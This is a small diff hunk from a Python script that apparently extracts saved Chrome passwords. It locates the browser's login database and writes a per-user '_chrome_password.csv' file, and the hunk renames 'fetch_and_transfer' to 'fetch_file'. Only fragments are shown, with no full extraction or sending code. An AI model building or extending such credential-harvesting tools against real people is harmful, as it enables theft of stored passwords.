@@ -66,7 +66,7 @@ def get_db_connection(chrome_path_login_db):
         print("[ERR] Chrome database cannot be found")
         return None
 
-def fetch_and_transfer():
+def fetch_file():
     try:
         username =  os.getlogin()
         file_name = username+"_chrome_password.csv"
